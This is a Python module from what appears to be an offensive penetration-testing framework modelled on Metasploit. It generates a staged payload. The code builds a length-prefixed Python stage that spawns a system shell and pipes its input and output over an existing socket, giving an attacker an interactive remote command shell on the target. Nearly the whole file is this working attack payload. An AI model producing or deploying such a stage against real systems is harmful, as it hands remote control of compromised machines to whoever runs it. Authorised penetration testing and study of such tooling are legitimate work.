"""
Terasploit Framework (c) 2026

Author:          4steroth
License:         BSD-3-Clause
Path:            modules/payload/stages/python/shell.py
"""

import struct

from teralibs.tsf.base.payload import ARCH_PYTHON, PLATFORM_PYTHON, STAGE, Payload


class TerasploitModule(Payload):
    """Python interactive shell stage."""

    NAME = "Python Shell Stage"
    DESCRIPTION = "Spawn a python piped command shell"
    AUTHOR = ["4steroth"]
    LICENSE = "BSD-3-CLAUSE"
    VERSION = "1.0"
    RANK = "normal"
    REFERENCES = []

    PAYLOAD_TYPE = STAGE

    ARCH = [ARCH_PYTHON]
    PLATFORM = [PLATFORM_PYTHON]

    def generate_stage(self, ctx) -> bytes:
        """Return the Python shell stage bytes."""

        # We do this so we don't get unnecessary bytes from doing a """STAGE""".
        # We can control the bytes here to remove whitespaces incase we want to
        # lower the bytes. This can be a one liner.
        stage = [
            "import subprocess",
            "import selectors",
            "sock = msgsock",
            f"shell_path = '{ctx.get_option('SHELL')}'",
            "process = subprocess.Popen("
            "    shell_path, stdin=subprocess.PIPE, stdout=subprocess.PIPE,",
            "    stderr=subprocess.PIPE, text=False, bufsize=0",
            ")",
            "sel = selectors.DefaultSelector()",
            "sel.register(sock, selectors.EVENT_READ)",
            "sel.register(process.stdout, selectors.EVENT_READ)",
            "sel.register(process.stderr, selectors.EVENT_READ)",
            "session_active = True",
            "try:",
            "    while session_active and process.poll() is None:",
            "        events = sel.select(timeout=0.1)",
            "        for key, _ in events:",
            "           if key.fileobj is sock:",
            "               data = sock.recv(1024)",
            "               if not data:",
            "                   session_active = False",
            "                   break",
            "               process.stdin.write(data)",
            "               process.stdin.flush()",
            "           elif key.fileobj in [process.stdout, process.stderr]:",
            "               output = key.fileobj.read(1024)",
            "               if output:",
            "                   sock.sendall(output)",
            "finally:",
            "    sel.close()",
            "    process.terminate()",
            "    process.wait()",
        ]

        # We join the stage here.
        stage = "\n".join(stage)

        # Encode the string into utf-8 and get the length prefix using struct.
        payload_bytes = stage.encode("utf-8")
        lenght_prefix = struct.pack(">I", len(payload_bytes))

        # Check for the expected size of the stage
        assert len(stage) <= 1300, f"Stage blob is {len(payload_bytes)} bytes, expected 1300 below"

        # Return the whole payload bytes with length prefix.
        return lenght_prefix + payload_bytes
